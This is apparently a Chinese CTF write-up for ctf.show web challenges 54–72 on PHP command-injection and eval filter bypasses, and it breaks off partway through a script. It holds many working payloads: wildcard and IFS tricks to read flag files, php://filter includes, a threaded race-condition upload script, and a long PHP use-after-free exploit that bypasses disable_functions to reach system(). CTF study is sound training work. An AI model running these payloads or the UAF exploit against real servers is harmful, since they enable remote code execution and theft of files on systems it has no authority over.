<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;c&#39;</span>])){
    $c<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;c&#39;</span>];
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|</span><span style="color:#ae81ff">\x09</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\x26</span><span style="color:#e6db74">|\&gt;|\&lt;/i&#34;</span>, $c)){
        <span style="color:#a6e22e">system</span>($c);
    }
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p>这里<code>grep</code>没有被过滤：<br>
<code>grep test *file   #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</code></p>
<p>payload1=<code>?c=grep${IFS}%27{%27${IFS}fla??php</code>（带{}浏览器会报错）</p>
<p>payload2:<code>?c=/bin/ca?$IFS./f???.php%0a%23</code>(%0a为换行符，%23为#)，右键查看源码即可</p>
<h3 id="web55">web55</h3>
<pre><code>// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match(&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
</code></pre><p>知识点：</p>
<p>1.bin目录</p>
<p>​	bin目录主要放置一些系统的必备执行档，如cat、chmod df、dmesg、gzip、kill、ls、mkdir、more、</p>
<p>​	mount、rm、su、tar、base64等</p>
<p>​	这里可以用base64里的64进行通配符匹配，即<code>?c=/bin/base64 flag.php</code></p>
<p>​	payload1:<code>?c=/???/????base64%20????.???</code></p>
<p>2./usr/bin 目录</p>
<p>​	主要放置一些应用软件工具的必备执行档，如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、</p>
<p>free、gnome、  zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、</p>
<p>newaliases、nslookup passwd、quota、smb、wget等</p>
<p>​	这里可以利用/usr/bin下的bzip2</p>
<p>​	payload2:<code>?c=/???/???/????2 ????.???</code></p>
<p>​	把文件变成压缩包？然后访问url/flag.php.bz2得到flag</p>
<h3 id="web56">web56</h3>
<p><strong>知识点：.file执行文件</strong></p>
<p>一位大佬的博客：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> threading

url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://21fab4a5-7ccf-4cb7-b5d3-b101e5c33634.chall.ctf.show/&#39;</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;?c=.+/???/????????[@-[]&#39;</span>


<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">post</span>():
    files<span style="color:#f92672">=</span>{
        <span style="color:#e6db74">&#39;upload&#39;</span>:<span style="color:#e6db74">&#39;#!/bin/sh</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">echo 1433223</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">cat flag.php&#39;</span>
    }
    r<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>post(url,files<span style="color:#f92672">=</span>files)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">req</span>():
    r<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">+</span>payload)
    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;1433223&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
        <span style="color:#66d9ef">print</span>(r<span style="color:#f92672">.</span>text)    

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">50</span>):
    threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>post,args<span style="color:#f92672">=</span>())<span style="color:#f92672">.</span>start()
    threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>req,args<span style="color:#f92672">=</span>())<span style="color:#f92672">.</span>start()
</code></pre></div><p>另一位的博客：</p>
<p><a href="https://www.cnblogs.com/NPFS/p/13797436.html">https://www.cnblogs.com/NPFS/p/13797436.html</a></p>
<h3 id="web57">web57</h3>
<p>神奇的新姿势，$(())与整数运算构造出36：</p>
<blockquote>
<p>${_}: 代表上一次命令执行的结果
$(())：做运算
$((&quot;&quot;))值为0
$((~$((&quot;&quot;))))值为-1，多次拼接可以得到</p>
</blockquote>
<p>$((~$(($((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${<em>}))))$((~$((${</em>}))))$((~$((${_}))))))))</p>
<h3 id="web58-65">web58-65</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">// 你们在炫技吗？
</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;c&#39;</span>])){
        $c<span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;c&#39;</span>];
        <span style="color:#66d9ef">eval</span>($c);
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
</code></pre></div><p>payload1：<code>c=show_source('flag.php');</code></p>
<p>payload2：POST: <code>c=include($_GET['url']);</code></p>
<p>​					GET:<code>?url=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
<p>​					（用python来做方便一点）</p>
<h3 id="web66">web66</h3>
<p>POST：<code>c=print_r(scandir(&quot;/&quot;));</code>，查看根目录文件</p>
<p>POST：<code>c=highlight_file(&quot;/flag.txt&quot;);</code></p>
<h3 id="web67">web67</h3>
<p>print_r被禁，可以使用var_dump代替</p>
<p>POST：<code>c=var_dump(scandir(&quot;/&quot;));</code>，查看根目录文件</p>
<p>POST：<code>c=highlight_file(&quot;/flag.txt&quot;);</code></p>
<h3 id="web68">web68</h3>
<p>highlight被禁，使用include</p>
<p><code>c=include(&quot;/flag.txt&quot;);</code></p>
<h3 id="web69">web69</h3>
<p>var_dump()被禁，使用var_export()</p>
<p>POST：<code>c=vat_export(scandir(&quot;/&quot;);</code>，查看目录</p>
<h3 id="web70">web70</h3>
<p>与highlight_file有相同效果的ini_set()、error_reporting()被禁</p>
<p>用include或require</p>
<h3 id="web71">web71</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
<span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;display_errors&#39;</span>, <span style="color:#ae81ff">0</span>);
<span style="color:#75715e">// 你们在炫技吗？
</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;c&#39;</span>])){
        $c<span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;c&#39;</span>];
        <span style="color:#66d9ef">eval</span>($c);
        $s <span style="color:#f92672">=</span> <span style="color:#a6e22e">ob_get_contents</span>();<span style="color:#75715e">//得到缓冲区的数据。
</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">ob_end_clean</span>();<span style="color:#75715e">//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/[0-9]|[a-z]/i&#34;</span>,<span style="color:#e6db74">&#34;?&#34;</span>,$s);
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>用c=<code>var_export(scandir(&quot;/&quot;));exit();</code></p>
<p>或者以下读取文件，得到flag.txt</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">&lt;?php
</span><span style="color:#960050;background-color:#1e0010">$a=new DirectoryIterator(&#34;glob:///*&#34;);
</span><span style="color:#960050;background-color:#1e0010">foreach($a as $f)
</span><span style="color:#960050;background-color:#1e0010">{echo($f-&gt;__toString().&#39; &#39;);
</span><span style="color:#960050;background-color:#1e0010">}
</span><span style="color:#960050;background-color:#1e0010">exit(0);
</span><span style="color:#960050;background-color:#1e0010">?&gt;
</span></code></pre></div><p>payload：c=<code>include('/flag.txt');exit(0);</code></p>
<h3 id="web72">web72</h3>
<p><strong>知识点</strong>：bypass open_basedir</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>

<span style="color:#75715e">/*
</span><span style="color:#75715e"># -*- coding: utf-8 -*-
</span><span style="color:#75715e"># @Author: Lazzaro
</span><span style="color:#75715e"># @Date:   2020-09-05 20:49:30
</span><span style="color:#75715e"># @Last Modified by:   h1xa
</span><span style="color:#75715e"># @Last Modified time: 2020-09-07 22:02:47
</span><span style="color:#75715e"># @email: h1xa@ctfer.com
</span><span style="color:#75715e"># @link: https://ctfer.com
</span><span style="color:#75715e">
</span><span style="color:#75715e">*/</span>

<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
<span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;display_errors&#39;</span>, <span style="color:#ae81ff">0</span>);
<span style="color:#75715e">// 你们在炫技吗？
</span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;c&#39;</span>])){
        $c<span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;c&#39;</span>];
        <span style="color:#66d9ef">eval</span>($c);
        $s <span style="color:#f92672">=</span> <span style="color:#a6e22e">ob_get_contents</span>();
        <span style="color:#a6e22e">ob_end_clean</span>();
        <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#34;/[0-9]|[a-z]/i&#34;</span>,<span style="color:#e6db74">&#34;?&#34;</span>,$s);
}<span style="color:#66d9ef">else</span>{
    <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
}

<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>发现scandir()被禁，利用以下方法读取目录，得到flag0.txt</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">&lt;?php
</span><span style="color:#960050;background-color:#1e0010">$a=new DirectoryIterator(&#34;glob:///*&#34;);
</span><span style="color:#960050;background-color:#1e0010">foreach($a as $f)
</span><span style="color:#960050;background-color:#1e0010">{echo($f-&gt;__toString().&#39; &#39;);
</span><span style="color:#960050;background-color:#1e0010">}
</span><span style="color:#960050;background-color:#1e0010">exit(0);
</span><span style="color:#960050;background-color:#1e0010">?&gt;
</span></code></pre></div><p>接下来使用大佬的uaf脚本：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ctfshow</span>($cmd) {
    <span style="color:#66d9ef">global</span> $abc, $helper, $backtrace;

    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Vuln</span> {
        <span style="color:#66d9ef">public</span> $a;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct() {
            <span style="color:#66d9ef">global</span> $backtrace;
            <span style="color:#a6e22e">unset</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span>);
            $backtrace <span style="color:#f92672">=</span> (<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getTrace</span>();
            <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($backtrace[<span style="color:#ae81ff">1</span>][<span style="color:#e6db74">&#39;args&#39;</span>])) {
                $backtrace <span style="color:#f92672">=</span> <span style="color:#a6e22e">debug_backtrace</span>();
            }
        }
    }

    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Helper</span> {
        <span style="color:#66d9ef">public</span> $a, $b, $c, $d;
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">str2ptr</span>(<span style="color:#f92672">&amp;</span>$str, $p <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, $s <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>) {
        $address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
        <span style="color:#66d9ef">for</span>($j <span style="color:#f92672">=</span> $s<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; $j <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>; $j<span style="color:#f92672">--</span>) {
            $address <span style="color:#f92672">&lt;&lt;=</span> <span style="color:#ae81ff">8</span>;
            $address <span style="color:#f92672">|=</span> <span style="color:#a6e22e">ord</span>($str[$p<span style="color:#f92672">+</span>$j]);
        }
        <span style="color:#66d9ef">return</span> $address;
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ptr2str</span>($ptr, $m <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>) {
        $out <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
        <span style="color:#66d9ef">for</span> ($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $m; $i<span style="color:#f92672">++</span>) {
            $out <span style="color:#f92672">.=</span> <span style="color:#a6e22e">sprintf</span>(<span style="color:#e6db74">&#34;%c&#34;</span>,($ptr <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>));
            $ptr <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">8</span>;
        }
        <span style="color:#66d9ef">return</span> $out;
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">write</span>(<span style="color:#f92672">&amp;</span>$str, $p, $v, $n <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>) {
        $i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
        <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $n; $i<span style="color:#f92672">++</span>) {
            $str[$p <span style="color:#f92672">+</span> $i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">sprintf</span>(<span style="color:#e6db74">&#34;%c&#34;</span>,($v <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>));
            $v <span style="color:#f92672">&gt;&gt;=</span> <span style="color:#ae81ff">8</span>;
        }
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">leak</span>($addr, $p <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, $s <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>) {
        <span style="color:#66d9ef">global</span> $abc, $helper;
        <span style="color:#a6e22e">write</span>($abc, <span style="color:#ae81ff">0x68</span>, $addr <span style="color:#f92672">+</span> $p <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x10</span>);
        $leak <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($helper<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span>);
        <span style="color:#66d9ef">if</span>($s <span style="color:#f92672">!=</span> <span style="color:#ae81ff">8</span>) { $leak <span style="color:#f92672">%=</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">&lt;&lt;</span> ($s <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>; }
        <span style="color:#66d9ef">return</span> $leak;
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">parse_elf</span>($base) {
        $e_type <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($base, <span style="color:#ae81ff">0x10</span>, <span style="color:#ae81ff">2</span>);

        $e_phoff <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($base, <span style="color:#ae81ff">0x20</span>);
        $e_phentsize <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($base, <span style="color:#ae81ff">0x36</span>, <span style="color:#ae81ff">2</span>);
        $e_phnum <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($base, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">2</span>);

        <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $e_phnum; $i<span style="color:#f92672">++</span>) {
            $header <span style="color:#f92672">=</span> $base <span style="color:#f92672">+</span> $e_phoff <span style="color:#f92672">+</span> $i <span style="color:#f92672">*</span> $e_phentsize;
            $p_type  <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($header, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">4</span>);
            $p_flags <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($header, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">4</span>);
            $p_vaddr <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($header, <span style="color:#ae81ff">0x10</span>);
            $p_memsz <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($header, <span style="color:#ae81ff">0x28</span>);

            <span style="color:#66d9ef">if</span>($p_type <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> $p_flags <span style="color:#f92672">==</span> <span style="color:#ae81ff">6</span>) {

                $data_addr <span style="color:#f92672">=</span> $e_type <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">?</span> $p_vaddr <span style="color:#f92672">:</span> $base <span style="color:#f92672">+</span> $p_vaddr;
                $data_size <span style="color:#f92672">=</span> $p_memsz;
            } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($p_type <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> $p_flags <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span>) {
                $text_size <span style="color:#f92672">=</span> $p_memsz;
            }
        }

        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$data_addr <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>$text_size <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>$data_size)
            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;

        <span style="color:#66d9ef">return</span> [$data_addr, $text_size, $data_size];
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_basic_funcs</span>($base, $elf) {
        <span style="color:#66d9ef">list</span>($data_addr, $text_size, $data_size) <span style="color:#f92672">=</span> $elf;
        <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $data_size <span style="color:#f92672">/</span> <span style="color:#ae81ff">8</span>; $i<span style="color:#f92672">++</span>) {
            $leak <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($data_addr, $i <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>);
            <span style="color:#66d9ef">if</span>($leak <span style="color:#f92672">-</span> $base <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> $leak <span style="color:#f92672">-</span> $base <span style="color:#f92672">&lt;</span> $data_addr <span style="color:#f92672">-</span> $base) {
                $deref <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($leak);

                <span style="color:#66d9ef">if</span>($deref <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x746e6174736e6f63</span>)
                    <span style="color:#66d9ef">continue</span>;
            } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">continue</span>;

            $leak <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($data_addr, ($i <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>);
            <span style="color:#66d9ef">if</span>($leak <span style="color:#f92672">-</span> $base <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">&amp;&amp;</span> $leak <span style="color:#f92672">-</span> $base <span style="color:#f92672">&lt;</span> $data_addr <span style="color:#f92672">-</span> $base) {
                $deref <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($leak);

                <span style="color:#66d9ef">if</span>($deref <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x786568326e6962</span>)
                    <span style="color:#66d9ef">continue</span>;
            } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">continue</span>;

            <span style="color:#66d9ef">return</span> $data_addr <span style="color:#f92672">+</span> $i <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>;
        }
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_binary_base</span>($binary_leak) {
        $base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
        $start <span style="color:#f92672">=</span> $binary_leak <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xfffffffffffff000</span>;
        <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x1000</span>; $i<span style="color:#f92672">++</span>) {
            $addr <span style="color:#f92672">=</span> $start <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">*</span> $i;
            $leak <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($addr, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>);
            <span style="color:#66d9ef">if</span>($leak <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x10102464c457f</span>) {
                <span style="color:#66d9ef">return</span> $addr;
            }
        }
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_system</span>($basic_funcs) {
        $addr <span style="color:#f92672">=</span> $basic_funcs;
        <span style="color:#66d9ef">do</span> {
            $f_entry <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($addr);
            $f_name <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($f_entry, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">6</span>);

            <span style="color:#66d9ef">if</span>($f_name <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x6d6574737973</span>) {
                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">leak</span>($addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);
            }
            $addr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x20</span>;
        } <span style="color:#66d9ef">while</span>($f_entry <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>);
        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
    }

    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">trigger_uaf</span>($arg) {

        $arg <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_shuffle</span>(<span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span>);
        $vuln <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Vuln</span>();
        $vuln<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> $arg;
    }

    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">stristr</span>(<span style="color:#66d9ef">PHP_OS</span>, <span style="color:#e6db74">&#39;WIN&#39;</span>)) {
        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;This PoC is for *nix systems only.&#39;</span>);
    }

    $n_alloc <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
    $contiguous <span style="color:#f92672">=</span> [];
    <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $n_alloc; $i<span style="color:#f92672">++</span>)
        $contiguous[] <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_shuffle</span>(<span style="color:#e6db74">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span>);

    <span style="color:#a6e22e">trigger_uaf</span>(<span style="color:#e6db74">&#39;x&#39;</span>);
    $abc <span style="color:#f92672">=</span> $backtrace[<span style="color:#ae81ff">1</span>][<span style="color:#e6db74">&#39;args&#39;</span>][<span style="color:#ae81ff">0</span>];

    $helper <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Helper</span>;
    $helper<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> ($x) { };

    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($abc) <span style="color:#f92672">==</span> <span style="color:#ae81ff">79</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">strlen</span>($abc) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;UAF failed&#34;</span>);
    }

    $closure_handlers <span style="color:#f92672">=</span> <span style="color:#a6e22e">str2ptr</span>($abc, <span style="color:#ae81ff">0</span>);
    $php_heap <span style="color:#f92672">=</span> <span style="color:#a6e22e">str2ptr</span>($abc, <span style="color:#ae81ff">0x58</span>);
    $abc_addr <span style="color:#f92672">=</span> $php_heap <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xc8</span>;

    <span style="color:#a6e22e">write</span>($abc, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">2</span>);
    <span style="color:#a6e22e">write</span>($abc, <span style="color:#ae81ff">0x70</span>, <span style="color:#ae81ff">6</span>);

    <span style="color:#a6e22e">write</span>($abc, <span style="color:#ae81ff">0x10</span>, $abc_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x60</span>);
    <span style="color:#a6e22e">write</span>($abc, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0xa</span>);

    $closure_obj <span style="color:#f92672">=</span> <span style="color:#a6e22e">str2ptr</span>($abc, <span style="color:#ae81ff">0x20</span>);

    $binary_leak <span style="color:#f92672">=</span> <span style="color:#a6e22e">leak</span>($closure_handlers, <span style="color:#ae81ff">8</span>);
    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>($base <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_binary_base</span>($binary_leak))) {
        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Couldn&#39;t determine binary base address&#34;</span>);
    }

    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>($elf <span style="color:#f92672">=</span> <span style="color:#a6e22e">parse_elf</span>($base))) {
        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Couldn&#39;t parse ELF header&#34;</span>);
    }

    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>($basic_funcs <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_basic_funcs</span>($base, $elf))) {
        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Couldn&#39;t get basic_functions address&#34;</span>);
    }

